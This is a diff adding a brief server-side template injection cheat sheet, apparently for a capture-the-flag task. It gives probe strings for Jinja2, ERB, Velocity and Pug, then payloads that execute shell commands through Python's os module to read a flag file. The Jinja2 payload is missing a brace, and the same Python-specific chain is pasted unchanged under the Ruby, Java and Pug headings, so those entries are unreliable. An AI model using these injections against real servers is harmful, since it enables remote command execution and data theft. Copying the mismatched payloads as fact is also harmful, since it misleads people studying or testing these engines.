@@ -1,0 +1,21 @@
+Determine the flag:
+{{7*7}}          # Jinja2, Twig
+<%= 7*7 %>       # ERB (Ruby)
+${7*7}           # Velocity (Java)
+#{7*7}           # Jade / Pug
+
+Jinja2
+Read the flag:
+{ config.__class__.__init__.__globals__['os'].popen('cat /flag').read() }}
+
+ERB
+Read the flag:
+<%= config.__class__.__init__.__globals__['os'].popen('cat /flag').read() %>
+
+Velocity
+Read the flag:
+${config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}
+
+Jade / Pug
+Read the flag:
+#{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}
